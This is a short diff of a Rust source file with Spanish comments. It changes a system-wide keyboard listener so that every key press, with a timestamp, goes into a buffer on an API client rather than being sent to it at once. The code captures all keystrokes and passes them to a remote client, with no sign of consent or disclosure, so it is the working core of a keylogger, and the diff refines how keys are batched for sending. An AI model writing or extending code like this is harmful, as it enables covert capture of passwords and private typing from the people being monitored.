@@ -9,19 +9,19 @@ pub fn start(api_client: Arc<ApiClient>) -> Result<(), Box<dyn std::error::Error
         if let EventType::KeyPress(_) = event.event_type {
             if let Some(key) = event.name {
                 let timestamp = chrono::Local::now().to_rfc3339();
-                if let Err(e) = api_client.send_key(&key, &timestamp) {
-                    eprintln!("⚠️ Error enviando tecla '{}': {}", key, e);
+                // Agregar al buffer (NO envía inmediatamente)
+                if let Err(e) = api_client.add_key(&key, &timestamp) {
+                    eprintln!("⚠️ Error añadiendo tecla '{}' al buffer: {}", key, e);
                 }
             }
         }
     };
 
-    // ✅ CORREGIDO: Usar {:?} en lugar de {}
     if let Err(error) = listen(callback) {
         eprintln!("❌ Error crítico en el listener: {:?}", error);
         return Err(Box::new(std::io::Error::new(
             std::io::ErrorKind::Other,
-            format!("Error en listener: {:?}", error)  // <--- {:?} aquí también
+            format!("Error en listener: {:?}", error)
         )));
     }
 
